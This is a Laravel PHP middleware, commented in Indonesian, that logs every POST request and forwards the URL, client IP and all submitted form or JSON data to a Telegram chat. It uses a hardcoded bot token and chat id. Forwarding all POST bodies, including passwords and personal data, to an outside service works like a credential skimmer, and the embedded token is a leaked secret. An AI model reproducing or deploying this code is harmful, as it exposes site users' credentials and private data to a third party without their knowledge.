<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
// Tambahkan:
use GuzzleHttp\Client;

class LogPostRequests
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request   $request
     * @param  \Closure(\Illuminate\Http\Request):(\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
     * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
     */
    public function handle(Request $request, Closure $next)
    {
        // Periksa apakah metode request adalah POST
        if ($request->isMethod('post')) {
            // Ambil data yang sudah di-parse (form data / JSON)
            $parsedData = $request->all();

            // (Opsional) rawPayload kalau butuh debugging detail
            $rawPayload = $request->getContent();

            // 1) Tulis ke file log Laravel
            Log::info('POST Request Detected', [
                'url'        => $request->fullUrl(),
                'ip'         => $request->ip(),
                'parsedData' => $parsedData,
                'rawPayload' => $rawPayload,
            ]);

            // 2) Kirim pesan ringkas ke Telegram
            $message = "POST Request Detected\n"
                     . "URL: " . $request->fullUrl() . "\n"
                     . "IP: "  . $request->ip() . "\n"
                     // (Opsional) tampilkan ringkasan data 
                     . "Data: " . json_encode($parsedData);

            $this->sendToTelegram($message);
        }

        return $next($request);
    }

    /**
     * Mengirim pesan singkat ke Telegram melalui Bot API
     *
     * @param  string  $message
     * @return void
     */
    private function sendToTelegram($message)
    {
        // Ganti dengan token bot Anda
        $botToken = '6920061881:AAEdKgQrvzP1RemLvA_DvugBRjp1NvsA9J0';

        // Ganti dengan chat_id / group_id tempat menerima notifikasi
        $chatId   = '-1002517788043';

        // Endpoint Bot API Telegram
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

        // Buat instance Guzzle
        $client = new Client();

        // Lakukan POST request ke Telegram
        $client->post($url, [
            'form_params' => [
                'chat_id' => $chatId,
                'text'    => $message,
            ],
        ]);
    }
}
